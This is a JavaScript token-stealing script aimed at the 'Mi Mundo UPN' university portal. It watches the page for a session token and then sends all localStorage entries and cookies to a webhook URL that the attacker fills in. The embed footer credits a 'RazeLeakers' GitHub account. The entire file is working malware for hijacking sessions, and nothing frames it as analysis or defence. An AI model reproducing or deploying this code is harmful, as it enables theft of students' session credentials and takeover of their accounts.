const myWebhookURL = "";

function sendlocalData(webhookURL) {
  const request = new XMLHttpRequest();

  const lStorageData = [
    {
      name: "-----------------------\nLocal Storage\n-----------------------",
      value: "",
    },
  ];

  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      let valueContent = localStorage.getItem(key);
      let otherPart = valueContent.length;

      if (otherPart >= 1024) {
        otherPart = Math.floor(otherPart / 2);
      }

      lStorageData.push({
        name: key.concat(otherPart !== valueContent.length ? " - Part 1" : ""),
        value: valueContent.substring(0, otherPart),
      });

      if (otherPart !== valueContent.length) {
        lStorageData.push({
          name: key.concat(" - Part 2"),
          value: valueContent.substring(otherPart),
        });
      }
    }
  }

  const cookiesData = [
    {
      name: "-----------------------\nCookies\n-----------------------",
      value: "",
    },
  ];

  for (let content of document.cookie.split(";")) {
    content = content.trim();
    let nameContent = content.substring(0, content.indexOf("="));
    let valueContent = content.substring(content.indexOf("=") + 1);
    let otherPart = valueContent.length;

    if (otherPart >= 1024) {
      otherPart = Math.floor(otherPart / 2);
    }

    cookiesData.push({
      name: nameContent.concat(
        otherPart !== valueContent.length ? " - Part 1" : ""
      ),
      value: valueContent.substring(0, otherPart),
    });

    if (otherPart !== valueContent.length) {
      cookiesData.push({
        name: nameContent.concat(" - Part 2"),
        value: valueContent.substring(otherPart),
      });
    }
  }

  const params = JSON.stringify({
    content: null,
    embeds: [
      {
        title: "Mi Mundo UPN",
        url: "https://mimundo.upn.edu.pe/",
        color: 8245659,
        fields: lStorageData,
      },
      {
        color: 3381182,
        fields: cookiesData,
        footer: {
          text: "github.com/RazeLeakers",
        },
        timestamp: new Date().toISOString(),
      },
    ],
    username: "LinziTrixi",
    avatar_url: "https://avatars.githubusercontent.com/u/154272786?s=200&v=4",
    attachments: [],
  });

  request.open("POST", webhookURL);
  request.setRequestHeader("Content-type", "application/json");
  request.onload = function () {
    if (request.status >= 200 && request.status < 300) {
      console.log("%cSend!", "color: green; font-size: 80px;");
    } else {
      console.log(
        "%cStatus Error " + request.status + "!",
        "color: yellow; font-size: 80px;"
      );
    }
  };
  request.onerror = function () {
    console.log("%cFatal Error", "color: red; font-size: 80px;");
  };
  request.send(params);
}

let saveToken = "";

const observer = new MutationObserver(() => {
  let userToken = localStorage.getItem("user");

  if (!userToken) return;

  userToken = userToken.includes("mooToken")
    ? localStorage.getItem("mooToken")
    : null;

  if (!userToken || userToken === saveToken) return;

  sendlocalData(myWebhookURL);

  saveToken = userToken;
});

observer.observe(document.body, { childList: true, subtree: true });
